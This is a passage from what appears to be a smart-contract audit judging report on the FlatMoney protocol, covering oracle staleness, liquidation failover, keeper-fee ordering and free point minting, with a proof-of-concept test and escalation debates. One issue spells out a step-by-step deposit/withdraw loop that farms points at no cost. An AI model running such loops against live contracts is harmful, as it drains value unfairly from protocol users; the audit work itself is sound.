132:             revert FlatcoinErrors.PriceStale(
133:                 offchain ? FlatcoinErrors.PriceSource.OffChain : FlatcoinErrors.PriceSource.OnChain
134:             );
135:         }
136:     }
```

L107, onchainTime = `updatedAt` returned by `oracle.latestRoundData()` from chainlink. `updatedAt` depends on the symbol's heartBeat. The heartbeats of almost chainlink price feeds are based on hours (such as 24 hours, 1 hour, etc.). Therefore, `onchainTime` is always lagging time, and the probability of being equal to `block.timestamp` is low. 

L108, `offchainTime = publishTime of priceUpdateData = 1707000003`

L117-124, `timestamp = max(onchainTime, offchainTime)`, in most cases `offchainTime` is larger.

L131, in this case `maxAge=0`,

```data
maxAge < type(uint32).max && timestamp + maxAge < block.timestamp =>
0 < type(uint32).max && 1707000003 + 0 < 1707000005 =>
0 < type(uint32).max && 1707000003 < 1707000005
```

So if statement is met, tx revert.

## Impact

- Pending orders cannot be executed in time. For time-sensitive protocol, this is unacceptable.
- The keeper obviously submitted the fresh price, but the tx failed with `FlatcoinErrors.PriceStale`.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L94-L96

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L159-L161

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L270-L272

## Tool used

Manual Review

## Recommendation

The cases in the report need to be considered.

```fix
File: flatcoin-v1\src\LeverageModule.sol
449:     function _getMaxAge(uint64 _executableAtTime) internal view returns (uint32 _maxAge) {
450:-        return (block.timestamp - _executableAtTime).toUint32();
450:+        return (block.timestamp - _executableAtTime + vault.minExecutabilityAge()).toUint32();
451:     }
```



## Discussion

**nevillehuang**

Request PoC to facilitate discussion between sponsor and watson

Sponsor comments:

> From practice, it's not true. Pyth Network price feeds update once per second

**sherlock-admin2**

PoC requested from @securitygrid

Requests remaining: **11**

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid:  this semm valid to me; medium(10)



**securitygrid**

copy the following POC to test/unit/Common/CancelOrder.t.sol:
```solidity
function test_170() public {
        setWethPrice(2000e8);
        skip(120);

        // First deposit mint doesn't use offchain oracle price
        announceAndExecuteDeposit({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: 100e18,
            oraclePrice: 2000e8,
            keeperFeeAmount: 0
        });

        announceOpenLeverage({traderAccount: alice, margin: 100e18, additionalSize: 100e18, keeperFeeAmount: 0});
        //keeper got offchain price before order.executableAtTime
        skip(vaultProxy.minExecutabilityAge() - 1);
        bytes[] memory priceUpdateData = getPriceUpdateData(2000e8);
        //In order to compete for tradeFee, the keeper must execute orders as quickly as possible.
        skip(vaultProxy.minExecutabilityAge());
        vm.prank(keeper);
        delayedOrderProxy.executeOrder{value: 1}(alice, priceUpdateData);
    }
    function test_170_for_sponor() public {
        //From sponor's comment: From practice, it's not true. Pyth Network price feeds update once per second
        setWethPrice(2000e8);
        skip(120);

        // First deposit mint doesn't use offchain oracle price
        announceAndExecuteDeposit({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: 100e18,
            oraclePrice: 2000e8,
            keeperFeeAmount: 0
        });

        announceOpenLeverage({traderAccount: alice, margin: 100e18, additionalSize: 100e18, keeperFeeAmount: 0});
        //keeper got offchain price before order.executableAtTime
        skip(vaultProxy.minExecutabilityAge() - 1);
        bytes[] memory priceUpdateDataOld = getPriceUpdateData(2000e8);
        //In order to compete for tradeFee, the keeper must execute orders as quickly as possible.
        skip(vaultProxy.minExecutabilityAge());
        //In same block, other keeper or other project updates price. Therefore, such a situation is ok.
        bytes[] memory priceUpdateDataNew = getPriceUpdateData(2000e8);
        mockPyth.updatePriceFeeds{value: 1}(priceUpdateDataNew);
        //keeper executes order.
        vm.prank(keeper);
        delayedOrderProxy.executeOrder{value: 1}(alice, priceUpdateDataOld);
    }
/**output
Running 2 tests for test/unit/Common/CancelOrder.t.sol:CancelDepositTest
[FAIL. Reason: PriceStale(1)] test_170() (gas: 1329703)
[PASS] test_170_for_sponor() (gas: 1347073)
Test result: FAILED. 1 passed; 1 failed; 0 skipped; finished in 29.11ms
**/
```

**D-Ig**

hey, as far as I understood this whole report is based on the scenario that keeper monitors `OrderAnnounced` events and then immediately after queries pyth API to get the price update message and then waits `minExecutabilityAge` before execution. 

this is the wrong flow, as our keeper monitors events and does not query anything before `minExecutabilityAge`. pyth API is fetched after `minExecutabilityAge` and then call to execute order is made.

**securitygrid**

@D-Ig 

A pending order can be executed at [t0,t1].
The average block time of base is 2 seconds.
A well-developed keeper can make tx to be mined at t0. The purpose is to get keeperFee(First come, first served).
Therefore, the price must be obtained before t0.

> this is the wrong flow, as our keeper monitors events and does not query anything before minExecutabilityAge. pyth API is fetched after minExecutabilityAge and then call to execute order is made.

If the keeper can only come from the protocol, then I will not submit this report. The protocol hopes that that the more keepers the better.
Please reconsider this issue, thank you.

**nevillehuang**

Hi @rashtrakoff @D-Ig any further comments on the above highlighted comment?

**D-Ig**

> Hi @rashtrakoff @D-Ig any further comments on the above highlighted comment?

I don't know what else to add. for me it's a chicken and egg problem

**rashtrakoff**

Let's take a look at the statement which might create an issue:

    `timestamp + maxAge < block.timestamp`

Since `maxAge = block.timestamp - order.executableAtTime`

This can also be re-written as:

    `timestamp < order.executableAtTime`

Basically what I mean is that the price fetched from pyth API should be newer than executable at time. I believe this is what we intended anyway so I wouldn't consider this as an issue.

**securitygrid**

> A pending order can be executed at [t0,t1].

The problem described in this report is that the order can never be executed at t0. Because it takes time for a tx to be created, sent to the node and finally mined. The price timestamp is obtained when tx is created. Therefore it is smaller than t0.

**0xLogos**

Escalate 

Invalid

Keepers from protocol team will work. 

> After minExecutabilityAge seconds, the keeper executes the order via DelayedOrder.executeOrder. The priceUpdateData argument is obtained in step 2. Eventually tx will revert.

The fact that other keepers won't work is their desing problem.

**sherlock-admin2**

> Escalate 
> 
> Invalid
> 
> Keepers from protocol team will work. 
> 
> > After minExecutabilityAge seconds, the keeper executes the order via DelayedOrder.executeOrder. The priceUpdateData argument is obtained in step 2. Eventually tx will revert.
> 
> The fact that other keepers won't work is their desing problem.

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**securitygrid**

Disagree with this escalation.
The purpose of the protocol's own keeper is only to ensure that the system can operate.
The purpose of the third-party keepers is only to make a profit, that is, to compete for keeperFee (first come, first served).
I have fully described my views in the report/coded POC/previous comments. In the current implementation, an order cannot be executed at t0, even though the keeper takes a fresh price.
No more comments, leave it to Sherlock to judge, thank you

**Evert0x**

I think this reports highlights a potential mismatch in incentives for off chain components. Seems like the protocol can function in a healthy way without implementing the proposed change. That makes it a design choice.

Planning to accept escalation and invalidate. 

**nevillehuang**

Fair enough @Evert0x can be low severity given sponsor comments [here as well](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/170#issuecomment-1946774224)

**Czar102**

Result:
Low
Has duplicates

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [0xLogos](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/170/#issuecomment-1956143575): accepted

# Issue M-6: Oracle will not failover as expected during liquidation 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/177 

## Found by 
0xLogos, Stryder, alexzoid, evmboi32, ge6a, gqrp, jennifer37, nobody2018, trauki, xiaoming90
## Summary

Oracle will not failover as expected during liquidation. If the liquidation cannot be executed due to the revert described in the following scenario, underwater positions and bad debt accumulate in the protocol, threatening the solvency of the protocol.

## Vulnerability Detail

The liquidators have the option to update the Pyth price during liquidation. If the liquidators do not intend to update the Pyth price during liquidation, they have to call the second `liquidate(uint256 tokenId)` function at Line 85 below directly, which does not have the `updatePythPrice` modifier.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L75

```solidity
File: LiquidationModule.sol
75:     function liquidate(
76:         uint256 tokenID,
77:         bytes[] calldata priceUpdateData
78:     ) external payable whenNotPaused updatePythPrice(vault, msg.sender, priceUpdateData) {
79:         liquidate(tokenID);
80:     }
81: 
82:     /// @notice Function to liquidate a position.
83:     /// @dev One could directly call this method instead of `liquidate(uint256, bytes[])` if they don't want to update the Pyth price.
84:     /// @param tokenId The token ID of the leverage position.
85:     function liquidate(uint256 tokenId) public nonReentrant whenNotPaused liquidationInvariantChecks(vault, tokenId) {
86:         FlatcoinStructs.Position memory position = vault.getPosition(tokenId);
```

It was understood from the protocol team that the rationale for allowing the liquidators to execute a liquidation without updating the Pyth price is to ensure that the liquidations will work regardless of Pyth's working status, in which case Chainlink is the fallback, and the last oracle price will be used for the liquidation.

However, upon further review, it was found that the fallback mechanism within the FlatCoin protocol does not work as expected by the protocol team.

Assume that Pyth is down. In this case, no one would be able to fetch the latest off-chain price from Pyth network and update Pyth on-chain contract. As a result, the prices stored in the Pyth on-chain contract will become outdated and stale. 

When liquidation is executed in FlatCoin protocol, the following `_getPrice` function will be executed to fetch the price. Line 107 below will fetch the latest price from Chainlink, while Line 108 below will fetch the last available price on the Pyth on-chain contract. When the Pyth on-chain prices have not been updated for a period of time, the deviation between `onchainPrice` and `offchainPrice` will widen till a point where `diffPercent > maxDiffPercent` and a revert will occur at Line 113 below, thus blocking the liquidation from being carried out. As a result, the liquidation mechanism within the FlatCoin protocol will stop working.

Also, the protocol team's goal of allowing the liquidators to execute a liquidation without updating the Pyth price to ensure that the liquidations will work regardless of Pyth's working status will not be achieved.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L113

```solidity
File: OracleModule.sol
102:     /// @notice Returns the latest 18 decimal price of asset from either Pyth.network or Chainlink.
103:     /// @dev It verifies the Pyth network price against Chainlink price (ensure that it is within a threshold).
104:     /// @return price The latest 18 decimal price of asset.
105:     /// @return timestamp The timestamp of the latest price.
106:     function _getPrice(uint32 maxAge) internal view returns (uint256 price, uint256 timestamp) {
107:         (uint256 onchainPrice, uint256 onchainTime) = _getOnchainPrice(); // will revert if invalid
108:         (uint256 offchainPrice, uint256 offchainTime, bool offchainInvalid) = _getOffchainPrice();
109:         bool offchain;
110: 
111:         uint256 priceDiff = (int256(onchainPrice) - int256(offchainPrice)).abs();
112:         uint256 diffPercent = (priceDiff * 1e18) / onchainPrice;
113:         if (diffPercent > maxDiffPercent) revert FlatcoinErrors.PriceMismatch(diffPercent);
114: 
115:         if (offchainInvalid == false) {
116:             // return the freshest price
117:             if (offchainTime >= onchainTime) {
118:                 price = offchainPrice;
119:                 timestamp = offchainTime;
120:                 offchain = true;
121:             } else {
122:                 price = onchainPrice;
123:                 timestamp = onchainTime;
124:             }
125:         } else {
126:             price = onchainPrice;
127:             timestamp = onchainTime;
128:         }
129: 
130:         // Check that the timestamp is within the required age
131:         if (maxAge < type(uint32).max && timestamp + maxAge < block.timestamp) {
132:             revert FlatcoinErrors.PriceStale(
133:                 offchain ? FlatcoinErrors.PriceSource.OffChain : FlatcoinErrors.PriceSource.OnChain
134:             );
135:         }
136:     }
```

## Impact

The liquidation mechanism is the core component of the protocol and is important to the solvency of the protocol. If the liquidation cannot be executed due to the revert described in the above scenario, underwater positions and bad debt accumulate in the protocol threaten the solvency of the protocol.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L75

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L113C10-L113C92

## Tool used

Manual Review

## Recommendation

Consider implementing a feature to allow the protocol team to disable the price deviation check so that the protocol team can disable it in the event that Pyth network is down for an extended period of time.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: high(4)



**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/270.

# Issue M-7: Revert when adjusting the position 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/178 

## Found by 
qmdddd, shaka, xiaoming90


## Summary

The margin adjustment will revert unexpectedly when executing. Margin adjustment is time-sensitive as long traders often rely on it to increase their position's margin when their positions are on the verge of being liquidated to avoid liquidation.

If the margin adjustment fails to execute due to an inherent bug within its implementation, the user's position might be liquidated as the transaction to increase its margin fails to execute, leading to a loss of assets for the traders.

## Vulnerability Detail

When announcing an adjustment order, if the `marginAdjustment` is larger than 0, `marginAdjustment + totalFee` number of collateral will be transferred from the user account to the `DelayedOrder` contract. The `totalFee` comprises the keeper fee + trade fee.

Let's denote `marginAdjustment` as $M$, keeper fee as $K$, and trade fee as $T$. Thus, the balance of `DelayedOrder` is increased by $(M + K + T)$ rETH.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L303

```solidity
File: DelayedOrder.sol
217:     function announceLeverageAdjust(
..SNIP..
300:         // If user increases margin, fees are charged from their account.
301:         if (marginAdjustment > 0) {
302:             // Sending positive margin adjustment and both fees from the user to the delayed order contract.
303:             vault.collateral().safeTransferFrom(msg.sender, address(this), uint256(marginAdjustment) + totalFee);
304:         }
```

When the keeper executes the adjustment order, the following function calls will happen:

```solidity
DelayedOrder.executeOrder() => DelayedOrder._executeLeverageAdjust() => LeverageModule.executeAdjust()
```

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L137

```solidity
File: LeverageModule.sol
147:     function executeAdjust(
..SNIP..
234:         // Sending keeper fee from order contract to the executor.
235:         vault.sendCollateral({to: _keeper, amount: _order.keeperFee});
```

When the `LeverageModule.executeAdjust` function is executed, it will instruct the FlatCoin vault to send the $K$ rETH (keeper fee) to the keeper address. Thus, the amount of rETH held by the vault is reduced by $K$. However, in an edge case where the amount of rETH held by the vault is $V$ and $V < K$, the transaction will revert. 

This is because, at this point, the `DelayedOrder` contract has not forwarded the keeper fee it collected from the users to the FlatCoin vault yet. The keeper fee is only forwarded to the vault after the `executeAdjust` function is executed at Line 608 below, which is too late in the above-described edge case.

This edge case might occur if there is low liquidity in the vault, a high keeper fee in the market, or a combination of both. Thus, the implementation should not assume that there is always sufficient liquidity in the vault to pay the keeper in advance and collect the keeper fee from the `DelayedOrder` contract later.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L303

```solidity
File: DelayedOrder.sol
586:     /// @notice Execution of user delayed leverage adjust order.
587:     /// @dev Uses the Pyth network price to execute.
588:     /// @param account The user account which has a pending order.
589:     function _executeLeverageAdjust(address account) internal {
590:         FlatcoinStructs.Order memory order = _announcedOrder[account];
591:         FlatcoinStructs.AnnouncedLeverageAdjust memory leverageAdjust = abi.decode(
592:             order.orderData,
593:             (FlatcoinStructs.AnnouncedLeverageAdjust)
594:         );
595: 
596:         _prepareExecutionOrder(account, order.executableAtTime);
597: 
598:         ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).executeAdjust({
599:             account: account,
600:             keeper: msg.sender,
601:             order: order
602:         });
603: 
604:         if (leverageAdjust.marginAdjustment > 0) {
605:             // Sending positive margin adjustment and fees from delayed order contract to the vault
606:             vault.collateral().safeTransfer({
607:                 to: address(vault),
608:                 value: uint256(leverageAdjust.marginAdjustment) + leverageAdjust.tradeFee + order.keeperFee
609:             });
610:         }
```

## Impact

The margin adjustment will revert unexpectedly when executing, as shown in the scenario above. Margin adjustment is time-sensitive as long traders often rely on it to increase their position's margin when their positions are on the verge of being liquidated to avoid liquidation.

If the margin adjustment fails to execute due to an inherent bug within its implementation, the user's position might be liquidated as the transaction to increase its margin fails to execute, leading to a loss of assets for the traders.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L303

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L137

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L303

## Tool used

Manual Review

## Recommendation

Consider transferring the keeper fee to the vault first before sending it to the keeper's address to ensure that the transfer of the keeper fee will work under all circumstances.

```diff
function _executeLeverageAdjust(address account) internal {
    FlatcoinStructs.Order memory order = _announcedOrder[account];
    FlatcoinStructs.AnnouncedLeverageAdjust memory leverageAdjust = abi.decode(
        order.orderData,
        (FlatcoinStructs.AnnouncedLeverageAdjust)
    );

    _prepareExecutionOrder(account, order.executableAtTime);

+    if (leverageAdjust.marginAdjustment > 0) {
+        // Sending positive margin adjustment and fees from delayed order contract to the vault
+        vault.collateral().safeTransfer({
+            to: address(vault),
+            value: uint256(leverageAdjust.marginAdjustment) + leverageAdjust.tradeFee + order.keeperFee
+        });
+    }

    ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).executeAdjust({
        account: account,
        keeper: msg.sender,
        order: order
    });

-    if (leverageAdjust.marginAdjustment > 0) {
-        // Sending positive margin adjustment and fees from delayed order contract to the vault
-        vault.collateral().safeTransfer({
-            to: address(vault),
-            value: uint256(leverageAdjust.marginAdjustment) + leverageAdjust.tradeFee + order.keeperFee
-        });
-    }
```



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: medium(9)



**sherlock-admin**

The protocol team fixed this issue in PR/commit  https://github.com/dhedge/flatcoin-v1/pull/272.

**santipu03**

Escalate

This issue should be invalid.

In what possible scenario the vault won't have enough funds to cover for the keeper fee while adjusting a leveraged position? 

The vault will always have the funds from the LPs and the margins of the traders. Even in the extreme case that the vault only has one position open, the funds from LPs and the margin deposited will be enough to cover for the keeper fee while adjusting the position. 

The scenario where the vault doesn't have enough funds to cover the keeper fee is unreal, therefore, the issue should be invalidated. 

**sherlock-admin2**

> Escalate
> 
> This issue should be invalid.
> 
> In what possible scenario the vault won't have enough funds to cover for the keeper fee while adjusting a leveraged position? 
> 
> The vault will always have the funds from the LPs and the margins of the traders. Even in the extreme case that the vault only has one position open, the funds from LPs and the margin deposited will be enough to cover for the keeper fee while adjusting the position. 
> 
> The scenario where the vault doesn't have enough funds to cover the keeper fee is unreal, therefore, the issue should be invalidated. 

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**securitygrid**

I totally agree with santipu03's POV, which is why I didn't submit this issue.

**xiaoming9090**

Disagree with the above escalations. This is a valid issue as it highlights genuine accounting and logic flaws within the system. As mentioned in the report, this is an edge case, and this scenario might occur if there is low liquidity in the vault, a high keeper fee in the market, or a combination of both. One should not assume that there is always sufficient liquidity in the vault to pay the keeper in advance and collect the keeper fee back later at all times.

**0xjuaan**

The protocol will be running their own keepers. Thus, there won't be a shortage of keeper activity which is the only thing that can inflate keeperFee other than gas price. So keeperFee will not exceed gas fee estimates by much.  Since this will be on the base L2, low gas fees -> low keeperFee.


Combine that with the fact that for this bug to occur, the user needs to try to executeAdjust. This means that the vault already holds margin + tradeFee + keeperFee from the leverage position creation. This means that the vault holds plenty of rETH which it can send. 


Likelihood of this issue occuring is extremely low. Impact of this issue is medium/low. Hence, the severity is low at best.


**Evert0x**

Can someone provide more context on the exact scenario where the liquidity is insufficient to pay for the fee? 

> Combine that with the fact that for this bug to occur, the user needs to try to executeAdjust. This means that the vault already holds margin + tradeFee + keeperFee from the leverage position creation. This means that the vault holds plenty of rETH which it can send.

It seems like this logic will prevent this bug from being triggered. 

**xiaoming9090**

The keeper fee $K$ is computed based on a percentage of the adjustment made to the position's margin (`marginAdjustment`). If a user intends to make a huge adjustment (= huge `marginAdjustment`), the $K$ will be high.
The size of $K$ also depends on the keeper fee being configured at any point. Higher fee would lead to higher $K$.

The amount of rETH held by the vault ($V$) might be low in liquidity during the following scenario:

- When the vault is still in its early stage where there are few users
- A large number of users have withdrawn from the vault during a black swan event leaving little to no liquidity left on the vault

Thus, it is technically possible a state where $K > V$ would occur.

**0xjuaan**

In the absolute worst case, K would have to exceed `marginMin` + `1.5 * marginMin` + `tradeFee` + `keeperFee` for the revert to occur.

`keeperFee` and `tradeFee` are the fees paid to the vault when this user initially deposited `marginMin` to create the leverage position. 

In order to deposit `marginMin` in the first place, there must have been `1.5*marginMin` deposited from LPs (this is the minimum additional size) since the minimum leverage is 1.5x.

If my math is wrong, please correct me but due to the sheer impossibility of this scenario (above scenario is most optimistic for this issue), the issue should be low/informational. 

**Czar102**

It also seems that this transaction failure could be easily mitigated, apart from the off-chance of the off-chance of this issue happening. Would you agree that this is a low severity issue @xiaoming9090?

**xiaoming9090**

> It also seems that this transaction failure could be easily mitigated, apart from the off-chance of the off-chance of this issue happening. Would you agree that this is a low severity issue @xiaoming9090?

If a user wants to adjust their position by a specific amount and this issue occurs, the user could:
- Reduce the adjustment size so that the fee will be reduced accordingly to ensure the fee is smaller than the available liquidity to avoid the revert. However, the user might not achieve its intended goal (e.g., increase their margin to avoid being liquidated - in this case, the insufficient margin being top-up)
- Wait for other users to deposit into the protocol to replenish the available liquidity, which might or might not happen (e.g., due to a lack of users or an event where everyone is exiting). Once there is sufficient liquidity, execute the adjustment order, but it might be too late.

It does not seem that the above approach is "easy". I would consider it easy if one could resubmit their TX immediately without adjusting the intended adjustment size after the first failed execution, and the TX goes through the second time.

I do not think that a trading system, which is time-sensitive, should suggest its users reduce their adjustment size when they intend to increase their margin under any circumstance or have the users wait for the right condition before they can adjust their position size without valid reasons (lack of liquidity is not valid). In the first place, the accounting within the system should be robust to handle such scenario.



**Czar102**

@xiaoming9090 Couldn't the user deposit themselves? In the end, a only small fraction of the position needs to be deposited, so they should be able to do that easily.

**xiaoming9090**

> @xiaoming9090 Couldn't the user deposit themselves? In the end, a only small fraction of the position needs to be deposited, so they should be able to do that easily.

Yes, users could deposit themselves to bump up the available liquidity to work around the issue.

**Czar102**

Planning to consider this issue a Low severity one.

**Czar102**

Result:
Low
Has duplicates


**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [santipu03](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/178/#issuecomment-1955101064): accepted

# Issue M-8: Large amounts of points can be minted virtually without any cost 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/187 

The protocol has acknowledged this issue.

## Found by 
Bauer, Dliteofficial, GoSlang, evmboi32, jennifer37, joicygiore, nobody2018, novaman33, vesla0xfa, xiaoming90
## Summary

Large amounts of points can be minted virtually without any cost. The points are intended to be used to exchange something of value. A malicious user could abuse this to obtain a large number of points, which could obtain excessive value and create unfairness among other protocol users.

## Vulnerability Detail

When depositing stable collateral, the LPs only need to pay for the keeper fee. The keeper fee will be sent to the caller who executed the deposit order.

When withdrawing stable collateral, the LPs need to pay for the keeper fee and withdraw fee. However, there is an instance where one does not need to pay for the withdrawal fee. Per the condition at Line 120 below, if the `totalSupply` is zero, this means that it is the final/last withdrawal. In this case, the withdraw fee will not be applicable and remain at zero.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L96

```solidity
File: StableModule.sol
096:     function executeWithdraw(
097:         address _account,
098:         uint64 _executableAtTime,
099:         FlatcoinStructs.AnnouncedStableWithdraw calldata _announcedWithdraw
100:     ) external whenNotPaused onlyAuthorizedModule returns (uint256 _amountOut, uint256 _withdrawFee) {
101:         uint256 withdrawAmount = _announcedWithdraw.withdrawAmount;
..SNIP..
112:         _burn(_account, withdrawAmount);
..SNIP..
118:         // Check that there is no significant impact on stable token price.
119:         // This should never happen and means that too much value or not enough value was withdrawn.
120:         if (totalSupply() > 0) {
121:             if (
122:                 stableCollateralPerShareAfter < stableCollateralPerShareBefore - 1e6 ||
123:                 stableCollateralPerShareAfter > stableCollateralPerShareBefore + 1e6
124:             ) revert FlatcoinErrors.PriceImpactDuringWithdraw();
125: 
126:             // Apply the withdraw fee if it's not the final withdrawal.
127:             _withdrawFee = (stableWithdrawFee * _amountOut) / 1e18;
128: 
129:             // additionalSkew = 0 because withdrawal was already processed above.
130:             vault.checkSkewMax({additionalSkew: 0});
131:         } else {
132:             // Need to check there are no longs open before allowing full system withdrawal.
133:             uint256 sizeOpenedTotal = vault.getVaultSummary().globalPositions.sizeOpenedTotal;
134: 
135:             if (sizeOpenedTotal != 0) revert FlatcoinErrors.MaxSkewReached(sizeOpenedTotal);
136:             if (stableCollateralPerShareAfter != 1e18) revert FlatcoinErrors.PriceImpactDuringFullWithdraw();
137:         }
```

When LPs deposit rETH and mint UNIT, the protocol will mint points to the depositor's account as per Line 84 below.

Assume that the vault has been newly deployed on-chain. Bob is the first LP to deposit rETH into the vault. Assume for a period of time (e.g., around 30 minutes), there are no other users depositing into the vault except for Bob.

Bob could perform the following actions to mint points for free:

- Bob announces a deposit order to deposit 100e18 rETH. Paid for the keeper fee. (Acting as a LP).
- Wait 10 seconds for the `minExecutabilityAge` to pass
- Bob executes the deposit order and mints 100e18 UNIT (Exchange rate 1:1). Protocol also mints 100e18 points to Bob's account. Bob gets back the keeper fee. (Acting as Keeper)
- Immediately after his `executeDeposit` TX, Bob inserts an "announce withdraw order" TX to withdraw all his 100e18 UNIT and pay for the keeper fee.
- Wait 10 seconds for the `minExecutabilityAge` to pass
- Bob executes the withdraw order and receives back his initial investment of 100e18 rETH. Since he is the only LP in the protocol, it is considered the final/last withdrawal, and he does not need to pay any withdraw fee. He also got back his keeper fee. (Acting as Keeper)

Each attack requires 20 seconds (10 + 10) to be executed. Bob could rinse and repeat the attack until he was no longer the only LP in the system, where he had to pay for the withdraw fee, which might make this attack unprofitable.

If Bob is the only LP in the system for 30 minutes, he could gain 9000e18 points (`(30 minutes / 20 seconds) * 100e18` ) for free as Bob could get back his keeper fee and does not incur any withdraw fee. The only thing that Bob needs to pay for is the gas fee, which is extremely cheap on L2 like Base.

```solidity
File: StableModule.sol
61:     function executeDeposit(
62:         address _account,
63:         uint64 _executableAtTime,
64:         FlatcoinStructs.AnnouncedStableDeposit calldata _announcedDeposit
65:     ) external whenNotPaused onlyAuthorizedModule returns (uint256 _liquidityMinted) {
66:         uint256 depositAmount = _announcedDeposit.depositAmount;
..SNIP..
70:         _liquidityMinted = (depositAmount * (10 ** decimals())) / stableCollateralPerShare(maxAge);
..SNIP..
75:         _mint(_account, _liquidityMinted);
76: 
77:         vault.updateStableCollateralTotal(int256(depositAmount));
..SNIP..
82:         // Mint points
83:         IPointsModule pointsModule = IPointsModule(vault.moduleAddress(FlatcoinModuleKeys._POINTS_MODULE_KEY));
84:         pointsModule.mintDeposit(_account, _announcedDeposit.depositAmount);
```

## Impact

Large amounts of points can be minted virtually without any cost. The points are intended to be used to exchange something of value. A malicious user could abuse this to obtain a large number of points, which could obtain excessive value from the protocol and create unfairness among other protocol users.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L96

## Tool used

Manual Review

## Recommendation

One approach that could mitigate this risk is also to impose withdraw fee for the final/last withdrawal so that no one could abuse this exception to perform any attack that was once not profitable due to the need to pay withdraw fee.

In addition, consider deducting the points once a position is closed or reduced in size so that no one can attempt to open and adjust/close a position repeatedly to obtain more points.



## Discussion

**sherlock-admin**

2 comment(s) were left on this issue during the judging contest.

**0xLogos** commented:
> low/info, points != funds

**takarez** commented:
>  invalid



**nevillehuang**

@rashtrakoff Any reason why this issue was disputed? What are the points FMP for?

I believe large amount of points shouldn't be freely minted.

**rashtrakoff**

@nevillehuang , this is a good find imo but since we are going to be the first depositors as well as creators of leverage positions as part of protocol initialisation I wouldn't believe this is something we  are concerned about. Furthermore, the points have no monetary value (at least not something we are going to assign) and there are costs associated with doing looping (keeper fees, possible losses due to price volatility etc.). Cc @itsermin @D-Ig .

**nevillehuang**

@rashtrakoff I will be maintaining as medium severity, even though points currently do not hold value, I believe it is not intended to allow free minting of points freely given it will hold some form of incentives in the future, so I believe it breaks core contract functionality. From my understanding, being the first depositor is only given as an example and is not required as shown in other issues such as #44 and #141.

**0xLogos**

Escalate 

Should be info

> the points have no monetary value
> there are costs associated with doing looping

**sherlock-admin2**

> Escalate 
> 
> Should be info
> 
> > the points have no monetary value
> > there are costs associated with doing looping

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**santipu03**

Agree with @0xLogos. 

Moreover, the withdrawal fee will make the attacker lose value with each withdrawal, making the attack unfeasable. 

Even in the improbable case that the attacker is a sophisticated bot that can act as a keeper and the withdrawal fee is not activated, the probability would be low with the impact being low/medium. Therefore, the overall severity should be low. 

**securitygrid**

This issue is valid. According to rules:

> Loss of airdrops or liquidity fees or any other rewards that are not part of the original protocol design is not considered a valid high/medium

FMP is part of the original protocol design. It's an incentive for users.

**0xcrunch**

Sponsor is OK with issues related to FMP if they are not relevant to the overall functioning of the protocol.

https://discord.com/channels/812037309376495636/1199005620536356874/1200372130253115413

**xiaoming9090**

If points are not an incentive or something of value to the user, then there is no purpose for having a points system in the first place. The obvious answer is that the points will not be worthless because it makes no sense for users to hold something that is worthless. With that, points should be considered something of value, and any bugs, such as infinity minting of points/values, should not be QA/Low.

**0xcrunch**

This kind of issue has no impact to the overall functioning of the protocol, so it is acceptable as stated by sponsor in the public channel.

**nevillehuang**

Agree with @xiaoming9090, I believe there is no logical reason why this should be allowed in the first place. 

@rashtrakoff What is the intended use case of points? It must have some incentive attached to it (even if its in the future), so users should never be getting points arbitrarily.

**itsermin**

Thanks for your inputs here @xiaoming9090 @nevillehuang 

I discussed this with @rashtrakoff today. Even though there's a cost associated with looped mints (trading fees). Being able to mint a large number of FMP is not ideal. The user could alao potentially LP on the UNIT side to minimise their downside.

We're looking at a couple of options:
